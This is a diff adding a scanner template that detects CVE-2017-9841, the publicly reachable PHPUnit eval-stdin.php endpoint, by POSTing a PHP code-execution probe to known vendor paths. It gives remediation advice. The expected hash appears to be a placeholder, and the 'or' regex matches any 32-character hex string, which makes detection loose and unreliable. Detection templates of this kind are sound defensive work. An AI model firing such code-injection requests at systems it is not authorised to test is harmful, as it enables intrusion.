@@ -1,0 +1,32 @@
+name: phpunit-eval-stdin-rce
+description: CVE-2017-9841 — PHPUnit eval-stdin.php is publicly accessible, allowing unauthenticated remote code execution
+severity: critical
+tags: [rce, phpunit, cve, php]
+owasp_id: A06:2021
+cwe_id: CWE-94
+remediation: |
+  Remove /vendor/phpunit directories from production deployments.
+  Never deploy development dependencies to production servers.
+  Add web server rules blocking access to /vendor/ directory.
+
+request:
+  method: POST
+  paths:
+    - /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+    - /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+    - /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: "<?php echo md5('plasma-rce-probe-test'); ?>"
+
+match:
+  status: [200]
+  words:
+    - "a14de8c5b7d3c8c9f7e9b4a1d2e3f6a7"
+  condition: or
+  regex:
+    - "[0-9a-f]{32}"
+  not_words:
+    - "404"
+    - "Not Found"
+    - "<html"
